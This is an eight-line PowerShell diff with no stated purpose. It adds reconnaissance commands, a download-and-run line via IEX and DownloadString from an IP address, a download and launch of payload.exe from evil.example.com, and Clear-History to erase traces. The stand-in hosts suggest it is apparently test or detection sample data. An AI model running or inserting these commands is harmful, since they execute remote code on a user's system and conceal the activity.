@@ -1,0 +1,8 @@
+Get-ChildItem C:\Users
+whoami /all
+IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')
+Get-Process | `
+  Where-Object CPU -gt 100
+Invoke-WebRequest -Uri https://evil.example.com/payload.exe -OutFile $env:TEMP\p.exe
+Start-Process $env:TEMP\p.exe
+Clear-History
